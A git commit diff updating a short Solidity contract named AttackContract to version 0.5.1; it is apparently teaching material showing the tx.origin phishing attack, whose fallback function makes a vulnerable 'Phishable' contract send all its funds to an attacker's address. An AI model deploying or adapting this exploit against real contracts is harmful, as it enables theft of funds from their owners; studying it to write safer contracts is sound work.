b6183a741bbd669954ebe7ca9b03f057aad33bc5
Saxon Knight <knight7@hawaii.edu>
2019-06-30 11:40:05 -1000

    Update AttackContract.sol to Solidity 0.5.1

--- AttackContract.sol
+++ AttackContract.sol
@@ -1,16 +1,18 @@
+pragma solidity ^0.5.1;
+
 import "browser/Phishable.sol";
 
 contract AttackContract {
     Phishable phishableContract;
 
-    address attacker; // The attacker's address to receive funds
+    address payable attacker; // The attacker's address to receive funds
 
-    constructor (Phishable _phishableContract, address _attackerAddress) {
+    constructor (Phishable _phishableContract, address payable _attackerAddress) public {
         phishableContract = _phishableContract;
         attacker = _attackerAddress;
     }
 
-    function () payable {
+    function () external payable {
         phishableContract.withdrawAll(attacker);
     }
 }
